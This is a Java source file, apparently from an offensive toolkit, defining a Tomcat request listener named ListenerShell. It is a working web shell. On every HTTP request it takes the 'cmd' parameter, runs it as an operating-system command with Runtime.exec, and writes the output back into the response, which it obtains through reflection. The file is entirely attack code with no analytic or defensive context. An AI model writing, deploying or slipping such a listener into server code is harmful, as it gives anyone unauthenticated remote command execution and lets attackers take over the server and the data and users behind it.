package tomcatShell.Listener;

import javax.servlet.ServletRequestEvent;
import javax.servlet.ServletRequestListener;
import javax.servlet.annotation.WebListener;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.BufferedReader;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.lang.reflect.Field;

@WebListener
public class ListenerShell implements ServletRequestListener {
    @Override
    public void requestDestroyed(ServletRequestEvent servletRequestEvent) {
    }

    @Override
    public void requestInitialized(ServletRequestEvent servletRequestEvent) {
        HttpServletRequest req = (HttpServletRequest)servletRequestEvent.getServletRequest();
        HttpServletResponse resp = this.getResponseFromRequest(req);
        String cmd = req.getParameter("cmd");
        try {
            String result = this.CommandExec(cmd);
            resp.getWriter().println(result);
            System.out.println("部署完成");
        } catch (Exception e) {

        }
    }
    public String CommandExec(String cmd) throws Exception {
        Runtime rt = Runtime.getRuntime();
        Process proc = rt.exec(cmd);
        InputStream stderr =  proc.getInputStream();
        InputStreamReader isr = new InputStreamReader(stderr);
        BufferedReader br = new BufferedReader(isr);
        String line = null;
        StringBuffer sb = new StringBuffer();
        while ((line = br.readLine()) != null) {
            sb.append(line + "\n");
        }
        return sb.toString();
    }

    public synchronized HttpServletResponse getResponseFromRequest(HttpServletRequest var1) {
        HttpServletResponse var2 = null;

        try {
            Field var3 = var1.getClass().getDeclaredField("response");
            var3.setAccessible(true);
            var2 = (HttpServletResponse)var3.get(var1);
        } catch (Exception var8) {
            try {
                Field var4 = var1.getClass().getDeclaredField("request");
                var4.setAccessible(true);
                Object var5 = var4.get(var1);
                Field var6 = var5.getClass().getDeclaredField("response");
                var6.setAccessible(true);
                var2 = (HttpServletResponse)var6.get(var5);
            } catch (Exception var7) {
            }
        }

        return var2;
    }
}